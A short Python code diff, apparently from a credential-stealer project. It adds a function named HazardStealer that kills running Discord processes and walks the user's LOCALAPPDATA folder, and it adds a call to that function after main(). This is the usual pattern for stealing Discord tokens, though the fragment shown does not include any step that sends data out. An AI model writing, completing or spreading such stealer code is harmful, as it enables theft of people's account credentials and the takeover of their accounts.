@@ -217,9 +217,10 @@ def main():
 	except:
 		pass
 
+def HazardStealer():
 	for proc in psutil.process_iter():
 		if any(procstr in proc.name() for procstr in\
-			['discord', 'Discord', 'DISCORD',]):
+		['discord', 'Discord', 'DISCORD',]):
 			proc.kill()
 	try:
 		for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
@@ -245,3 +246,4 @@ def main():
 
 if __name__ == "__main__":
 	main()
+	HazardStealer()
